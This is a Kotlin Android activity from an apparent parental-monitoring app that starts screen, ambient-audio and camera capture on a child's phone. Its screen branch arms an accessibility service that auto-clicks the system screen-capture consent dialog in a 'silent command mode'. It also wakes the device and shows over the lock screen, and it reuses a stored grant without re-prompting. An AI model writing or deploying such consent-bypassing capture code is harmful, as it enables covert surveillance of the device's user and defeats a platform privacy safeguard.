package org.setbd.control.webrtc

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.view.WindowManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

/**
 * Thin trampoline activity:
 *  - "screen": opens the system MediaProjection consent dialog and forwards
 *    the consent result to CaptureService (foreground service must be running
 *    before the projection is created on Android 14+). Shows over the lock
 *    screen and wakes the display so the dialog can never silently disappear
 *    behind the keyguard ("cast permission pops up then goes away").
 *  - "ambient"/"camera": simply starts the capture service from a foreground
 *    context (this satisfies Android's while-in-use requirement).
 */
class MirrorConsentActivity : AppCompatActivity() {

    /** Set once the projection result (OK or cancelled) has been delivered. */
    @Volatile
    private var resultDelivered = false

    private val projectionLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            val data = result.data
            if (result.resultCode == RESULT_OK && data != null) {
                // Remember the grant + confirm time: future mirror requests
                // inside the init window never re-prompt (no "Start now →
                // dialog again" loop), and pre-Android-14 requests reuse the
                // grant silently. The child allows screen sharing ONCE.
                ScreenGrantHolder.store(result.resultCode, data)
                CaptureService.startScreen(this, data, result.resultCode)
            }
            resultDelivered = true
            finish()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            )
        }
        launchFlow(intent)
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        // singleTask launchMode: a parent retry while this trampoline is still
        // alive arrives here instead of recreating the activity. Re-launching
        // the consent flow while the previous dialog is still up (or while the
        // result is being processed) STACKS two system dialogs — Android then
        // cancels both and the child sees the cast permission flash and vanish.
        // If a dialog was launched recently and no result came back yet, the
        // on-screen dialog IS the current flow: swallow the duplicate instead
        // of restarting it.
        val dialogInFlight =
            !resultDelivered &&
                System.currentTimeMillis() - lastDialogLaunchAt < DIALOG_IN_FLIGHT_MS
        if (dialogInFlight) return
        launchFlow(intent)
    }

    private fun launchFlow(intent: Intent?) {
        val kind = intent?.getStringExtra(EXTRA_KIND) ?: "screen"
        when (kind) {
            WebRtcCore.KIND_SCREEN -> {
                // Arm the accessibility auto-allow BEFORE the dialog opens so
                // silent command mode confirms it without any tap (the watcher
                // is time-boxed and only ever clicks the system dialog).
                org.setbd.control.controls.BlockAccessibilityService.armProjectionConfirm()
                val dialog = RtcStarter.screenCaptureIntent(this)
                if (dialog == null) {
                    finish()
                } else {
                    resultDelivered = false
                    lastDialogLaunchAt = System.currentTimeMillis()
                    projectionLauncher.launch(dialog)
                }
            }
            WebRtcCore.KIND_AMBIENT -> {
                CaptureService.startAmbient(this)
                finish()
            }
            WebRtcCore.KIND_CAMERA -> {
                CaptureService.startCamera(this, intent?.getStringExtra(EXTRA_FACING) ?: "front")
                finish()
            }
            else -> finish()
        }
    }

    companion object {
        const val EXTRA_KIND = "kind"
        const val EXTRA_FACING = "facing"

        /** A launched dialog owns the screen for this long before a retry may restart it. */
        private const val DIALOG_IN_FLIGHT_MS = 45_000L

        /** Timestamp of the last dialog launch — prevents stacked dialogs. */
        @Volatile
        var lastDialogLaunchAt: Long = 0L
            private set

        fun intent(context: android.content.Context, kind: String, facing: String?): Intent =
            Intent(context, MirrorConsentActivity::class.java)
                .putExtra(EXTRA_KIND, kind)
                .putExtra(EXTRA_FACING, facing ?: "front")
    }
}
